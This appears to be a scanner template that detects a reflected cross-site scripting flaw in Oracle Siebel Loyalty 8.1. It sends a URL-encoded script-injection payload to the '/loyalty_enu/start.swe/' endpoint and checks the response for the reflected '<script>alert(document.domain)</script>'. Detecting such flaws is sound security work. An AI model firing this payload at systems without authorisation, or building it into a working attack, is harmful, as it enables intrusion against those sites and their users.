id: oracle-siebel-xss
name: Oracle Siebel Loyalty 8.1 - Cross-Site Scripting
severity: high
confidence: tentative
description: A vulnerability in Oracle Siebel Loyalty allows remote unauthenticated attackers to inject arbitrary Javascript
  code into the responses returned by the '/loyalty_enu/start.swe/' endpoint.
reference: CWE-79
tags:
- xss
- oracle
- siebel
- packetstorm
- edb
- vuln
requests:
- method: GET
  path: /loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
  matchers:
  - type: body
    words:
    - </script><script>alert(document.domain)</script>
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
